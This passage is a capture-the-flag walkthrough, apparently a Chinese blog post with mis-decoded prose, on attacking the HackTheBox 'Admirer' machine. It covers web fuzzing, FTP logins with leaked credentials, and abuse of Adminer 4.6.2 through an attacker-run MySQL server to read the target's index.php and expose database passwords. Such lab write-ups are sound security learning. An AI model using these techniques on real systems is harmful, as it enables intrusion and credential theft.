</span></span><br><span class="line"><span class="string">000016327:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;                                                                         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 530.5189</span></span><br><span class="line"><span class="string">Processed Requests: 61419</span></span><br><span class="line"><span class="string">Filtered Requests: 61417</span></span><br><span class="line"><span class="string">Requests/sec.: 115.7715</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/htb/admirer#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¾æ¬¡è®¿é—®ï¼Œå‘ç°äº†FTPçš„ç”¨æˆ·åä¸å¯†ç </code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905141930354.png" class>

<img src="/2020/09/05/HTB-admirer/image-20200905142021895.png" class>

<h2 id="0x04-TFPç™»å…¥"><a href="#0x04-TFPç™»å…¥" class="headerlink" title="0x04.TFPç™»å…¥"></a>0x04.TFPç™»å…¥</h2><p><code>å‘ç°ä¸€ä¸ªsqlæ–‡ä»¶ä¸ç½‘ç«™æ ¹ç›®å½•æ–‡ä»¶</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># cat ftp.dic </span></span><br><span class="line">ftpuser   %n?4Wz&#125;R<span class="variable">$tTF7</span></span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ftp 10.10.10.187</span></span><br><span class="line">Connected to 10.10.10.187.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.187:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql</span><br><span class="line">-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p><code>ä¸‹è½½</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; get dump.sql</span><br><span class="line"><span class="built_in">local</span>: dump.sql remote: dump.sql</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> dump.sql (3405 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3405 bytes received <span class="keyword">in</span> 0.07 secs (46.7245 kB/s)</span><br><span class="line">ftp&gt; get html.tar.gz</span><br><span class="line"><span class="built_in">local</span>: html.tar.gz remote: html.tar.gz</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> html.tar.gz (5270987 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5270987 bytes received <span class="keyword">in</span> 10.78 secs (477.4579 kB/s)</span><br><span class="line">ftp&gt; <span class="built_in">exit</span></span><br><span class="line">221 Goodbye.</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ls</span></span><br><span class="line">big.txt  dump.sql  ftp.dic  html.tar.gz  nmap.CVT</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è§£å‹è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨utility-scriptsç›®å½•ï¼Œå¹¶ä¸”ä¹Ÿå‘ç°äº†æ•°æ®åº“çš„ä¸€ä¸ªç”¨æˆ·åä¸å¯†ç </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># ls</span></span><br><span class="line">assets  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r</span><br><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cd utility-scripts/</span></span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment"># ls</span></span><br><span class="line">admin_tasks.php  db_admin.php  info.php  phptest.php</span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment"># cat db_admin.php </span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line"></span><br><span class="line">  // Create connection</span><br><span class="line">  <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  // Check connection</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">      die(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // TODO: Finish implementing this or find a better open <span class="built_in">source</span> alternative</span><br><span class="line">?&gt;</span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¹Ÿå‘ç°äº†ç½‘ç«™ç”¨æˆ·åä¸å¯†ç ï¼Œå°è¯•sshç™»å…¥ä½†æ˜¯å¤±è´¥äº†ï¼Œåº”è¯¥æ˜¯è¿‡æœŸäº†ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cat index.php  | grep username</span></span><br><span class="line">                        <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">                        <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cat index.php  | grep password</span></span><br><span class="line">                        <span class="variable">$password</span> = <span class="string">&quot;]F7jLHw:*G&gt;UPrTo&#125;~A&quot;</span>d6b<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                        <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-è®¿é—®utility-scripts"><a href="#0x05-è®¿é—®utility-scripts" class="headerlink" title="0x05.è®¿é—®utility-scripts"></a>0x05.è®¿é—®utility-scripts</h2><p><code>ä¾ç„¶æ²¡æœ‰æƒé™ï¼Œå‘ç°ä¸‰ä¸ªç›®å½•</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905144337702.png" class>

<p><code>å†æ¬¡è¿›è¡ŒFUZZæµ‹è¯•</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z --hc 404,403 -t 50</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z</span></span><br><span class="line"><span class="string">Total requests: 61419</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                     </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000005618:   200        51 L     235 W    4157 Ch     &quot;adminer - php&quot;                                                                             </span></span><br><span class="line"><span class="string">000028853:   200        964 L    4976 W   84030 Ch    &quot;info - php&quot;                                                                                </span></span><br><span class="line"><span class="string">000041603:   200        0 L      8 W      32 Ch       &quot;phptest - php&quot;                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 496.4518</span></span><br><span class="line"><span class="string">Processed Requests: 61419</span></span><br><span class="line"><span class="string">Filtered Requests: 61416</span></span><br><span class="line"><span class="string">Requests/sec.: 123.7159</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/htb/admirer# </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¾æ¬¡è®¿é—®ï¼Œå‘ç°adminer.phpä¸ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆv4.62ï¼‰ç™»å…¥é¡µé¢</p>
</blockquote>
<img src="/2020/09/05/HTB-admirer/image-20200905150106096.png" class>

<h2 id="0x06-adminer-v4-62-æ¼æ´åˆ©ç”¨å‚è€ƒ"><a href="#0x06-adminer-v4-62-æ¼æ´åˆ©ç”¨å‚è€ƒ" class="headerlink" title="0x06.adminer(v4.62)æ¼æ´åˆ©ç”¨å‚è€ƒ"></a>0x06.adminer(v4.62)æ¼æ´åˆ©ç”¨<span class="exturl" data-url="aHR0cHM6Ly93d3cuZm9yZWdlbml4LmNvbS9ibG9nL3NlcmlvdXMtdnVsbmVyYWJpbGl0eS1kaXNjb3ZlcmVkLWluLWFkbWluZXItdG9vbA==">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></h2><blockquote>
<p>å‚è€ƒä¸­è¯´ï¼Œè¯¥æ¼æ´å¯ä»¥â€œåå‘â€è¿æ¥åˆ°æ‰˜ç®¡åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šçš„MySQLæ•°æ®åº“ã€‚</p>
</blockquote>
<p><code>exploit</code></p>
<h3 id="1-é¦–å…ˆå¯åŠ¨mysql"><a href="#1-é¦–å…ˆå¯åŠ¨mysql" class="headerlink" title="1.é¦–å…ˆå¯åŠ¨mysql"></a>1.é¦–å…ˆå¯åŠ¨mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># systemctl start mysql</span></span><br></pre></td></tr></table></figure>

<h3 id="2-åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥"><a href="#2-åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥" class="headerlink" title="2.åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥"></a>2.åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create database admirer;</span><br><span class="line">Query OK, 1 row affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>

<h3 id="3-åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a href="#3-åˆ›å»ºä¸€ä¸ªç”¨æˆ·" class="headerlink" title="3.åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a>3.åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h3><blockquote>
<p>æ­¤ç”¨æˆ·å¯†ç ä¸ºdemoï¼Œå¯ä»¥åœ¨ä»»æ„ä¸»æœºç™»å…¥</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create user <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;demo&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="4-èµ‹äºˆrootæƒé™ç»™demo"><a href="#4-èµ‹äºˆrootæƒé™ç»™demo" class="headerlink" title="4.èµ‹äºˆrootæƒé™ç»™demo"></a>4.èµ‹äºˆrootæƒé™ç»™demo</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; grant all privileges on * . * to <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="5-åˆ›å»ºä¸€ä¸ªè¡¨"><a href="#5-åˆ›å»ºä¸€ä¸ªè¡¨" class="headerlink" title="5.åˆ›å»ºä¸€ä¸ªè¡¨"></a>5.åˆ›å»ºä¸€ä¸ªè¡¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| admirer            |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use admirer;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [admirer]&gt; create table <span class="built_in">test</span> (data varchar(225));</span><br><span class="line">Query OK, 0 rows affected (0.007 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [admirer]&gt; show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_admirer |</span><br><span class="line">+-------------------+</span><br><span class="line">| <span class="built_in">test</span>              |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [admirer]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="6-ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®"><a href="#6-ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®" class="headerlink" title="6.ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®"></a>6.ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:/etc/mysql/mariadb.conf.d<span class="comment"># vim 50-server.cnf</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line"><span class="built_in">bind</span>-address            = 0.0.0.0</span><br><span class="line">Â·Â·Â·</span><br><span class="line">root@JIYE:/etc/mysql/mariadb.conf.d<span class="comment"># systemctl restart mysql</span></span><br></pre></td></tr></table></figure>

<h3 id="7-demoç™»å…¥æµ‹è¯•"><a href="#7-demoç™»å…¥æµ‹è¯•" class="headerlink" title="7.demoç™»å…¥æµ‹è¯•"></a>7.demoç™»å…¥æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># mysql -h localhost -udemo -pdemo</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 38</span><br><span class="line">Server version: 10.3.23-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x07-admirerç™»å…¥"><a href="#0x07-admirerç™»å…¥" class="headerlink" title="0x07.admirerç™»å…¥"></a>0x07.admirerç™»å…¥</h2><img src="/2020/09/05/HTB-admirer/image-20200905154605597.png" class>

<img src="/2020/09/05/HTB-admirer/image-20200905155937645.png" class>

<h3 id="1-å¯¼å…¥-etc-passwdåˆ°test"><a href="#1-å¯¼å…¥-etc-passwdåˆ°test" class="headerlink" title="1.å¯¼å…¥/etc/passwdåˆ°test"></a>1.å¯¼å…¥/etc/passwdåˆ°test</h3><p><code>ä¸èƒ½å¯¼å…¥</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905160349472.png" class>

<h3 id="2-å¯¼å…¥-var-www-html-index-phpåˆ°test"><a href="#2-å¯¼å…¥-var-www-html-index-phpåˆ°test" class="headerlink" title="2.å¯¼å…¥/var/www/html/index.phpåˆ°test"></a>2.å¯¼å…¥/var/www/html/index.phpåˆ°test</h3><p><code>å¯¼å…¥æˆåŠŸ</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905160705558.png" class>

<h3 id="3-å¯¼å‡ºtestè¡¨"><a href="#3-å¯¼å‡ºtestè¡¨" class="headerlink" title="3.å¯¼å‡ºtestè¡¨"></a>3.å¯¼å‡ºtestè¡¨</h3><img src="/2020/09/05/HTB-admirer/image-20200905160805405.png" class>

<p><code>å¯¼å‡ºæ–‡ä»¶å†…å®¹å¦‚ä¸‹</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-- Adminer <span class="number">4.6</span><span class="number">.2</span> MySQL dump</span><br><span class="line"></span><br><span class="line">SET NAMES utf8;</span><br><span class="line">SET time_zone = <span class="string">&#x27;+00:00&#x27;</span>;</span><br><span class="line">SET foreign_key_checks = <span class="number">0</span>;</span><br><span class="line">SET sql_mode = <span class="string">&#x27;NO_AUTO_VALUE_ON_ZERO&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line"></span><br><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `test`;</span><br><span class="line">CREATE TABLE `test` (</span><br><span class="line">  `data` varchar(<span class="number">225</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO `test` (`data`) VALUES</span><br><span class="line">(<span class="string">&#x27;&lt;!DOCTYPE HTML&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;!--&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    Multiverse by HTML5 UP&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    html5up.net | @ajlkn&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;--&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;html&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;head&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;title&gt;Admirer&lt;/title&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;meta charset=\&quot;utf-8\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1, user-scalable=no\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;link rel=\&quot;stylesheet\&quot; href=\&quot;assets/css/main.css\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;noscript&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;assets/css&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;/head&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;body class=\&quot;is-preload\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;!-- Wrapper --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;div id=\&quot;wrapper\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Header --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;header id=\&quot;header\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;h1&gt;&lt;a href=\&quot;index.html\&quot;&gt;&lt;strong&gt;Admirer&lt;/strong&gt; of skills and visuals&lt;/a&gt;&lt;/h1&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;nav&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;li&gt;&lt;a href=\&quot;#footer\&quot; class=\&quot;icon solid fa-info-circle\&quot;&gt;About&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/header&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Main --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;div id=\&quot;main\&quot;&gt;            &#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                     &lt;?php&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $servername = \&quot;localhost\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $username = \&quot;waldo\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $password = \&quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $dbname = \&quot;admirerdb\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        // Create connection&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $conn = new mysqli($servername, $username, $password, $dbname);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        // Check connection&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        if ($conn-&gt;connect_error) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            die(\&quot;Connection failed: \&quot; . $conn-&gt;connect_error);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $sql = \&quot;SELECT * FROM items\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $result = $conn-&gt;query($sql);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        if ($result-&gt;num_rows &gt; 0) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            // output data of each row&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            while($row = $result-&gt;fetch_assoc()) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;article class=\&#x27;thumb\&#x27;&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;a href=\&#x27;\&quot;.$row[\&quot;image_path\&quot;].\&quot;\&#x27; class=\&#x27;image\&#x27;&gt;&lt;img src=\&#x27;\&quot;.$row[\&quot;thumb_path\&quot;].\&quot;\&#x27; alt=\&#x27;\&#x27; /&gt;&lt;/a&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;h2&gt;\&quot;.$row[\&quot;title\&quot;].\&quot;&lt;/h2&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;p&gt;\&quot;.$row[\&quot;text\&quot;].\&quot;&lt;/p&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;/article&gt;\n\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125; else &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            echo \&quot;0 results\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $conn-&gt;close();&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    ?&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Footer --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;footer id=\&quot;footer\&quot; class=\&quot;panel\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;div class=\&quot;inner split\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Allow yourself to be amazed&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;p&gt;Skills are not to be envied, but to feel inspired by.&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    Visual arts and music are there to take care of your soul.&lt;br&gt;&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    Let your senses soak up these wonders...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/p&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Follow me on ...&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;ul class=\&quot;icons\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-twitter\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-facebook-f\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Facebook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-instagram\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Instagram&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-github\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;GitHub&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-dribbble\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;Dribbble&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;li&gt;&lt;a href=\&quot;#\&quot; class=\&quot;icon brands fa-linkedin-in\&quot;&gt;&lt;span class=\&quot;label\&quot;&gt;LinkedIn&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;h2&gt;Get in touch&lt;/h2&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;form method=\&quot;post\&quot; action=\&quot;#\&quot;&gt;&lt;!-- Still under development... This does not send anything yet, but it looks nice! --&gt;&#x27;</span>),</span><br><span class="line">(<span 